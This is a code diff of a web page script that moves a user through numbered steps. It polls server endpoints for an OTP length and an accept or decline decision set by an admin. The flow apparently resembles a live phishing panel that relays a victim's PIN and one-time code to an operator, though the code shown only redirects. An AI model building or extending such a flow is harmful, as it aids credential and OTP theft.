@@ -26,54 +26,49 @@
 
 <script>
 
-// ==============================
-// WAIT FOR OTP TRIGGER
-// ==============================
-if (localStorage.getItem("waitingForOtp") === "yes") {
+// ===== FIRST FLOW (STEP 4 → STEP 5) =====
+if (localStorage.getItem("firstProcess") === "yes") {
 
-    const checkInterval = setInterval(() => {
+    localStorage.removeItem("firstProcess");
+    localStorage.removeItem("fromPin"); // 🔥 IMPORTANT FIX
 
-        // CHECK OTP FROM SERVER
+    setTimeout(() => {
+        window.location.href = "step5.html";
+    }, 5000);
+
+}
+
+// ===== SECOND FLOW (WAIT FOR ADMIN) =====
+else if (localStorage.getItem("fromPin") === "yes") {
+
+    setInterval(() => {
+
+        // CHECK OTP
         fetch("/otp-status")
         .then(res => res.json())
         .then(data => {
             if (data.otp === 5 || data.otp === 6) {
                 localStorage.setItem("otpLength", data.otp);
-                localStorage.removeItem("waitingForOtp");
-
-                clearInterval(checkInterval);
+                localStorage.removeItem("fromPin");
                 window.location.href = "step6.html";
             }
         });
 
-    }, 2000);
-}
-
-
-// ==============================
-// AFTER OTP → WAIT FOR DECISION
-// ==============================
-if (localStorage.getItem("fromPin") === "yes") {
-
-    const decisionInterval = setInterval(() => {
-
+        // CHECK DECISION
         fetch("/decision-status")
         .then(res => res.json())
         .then(data => {
-
             if (data.decision === "accept") {
-                clearInterval(decisionInterval);
                 window.location.href = "success.html";
             }
 
             if (data.decision === "decline") {
-                clearInterval(decisionInterval);
                 window.location.href = "declined.html";
             }
-
         });
 
     }, 2000);
+
 }
 
 </script>
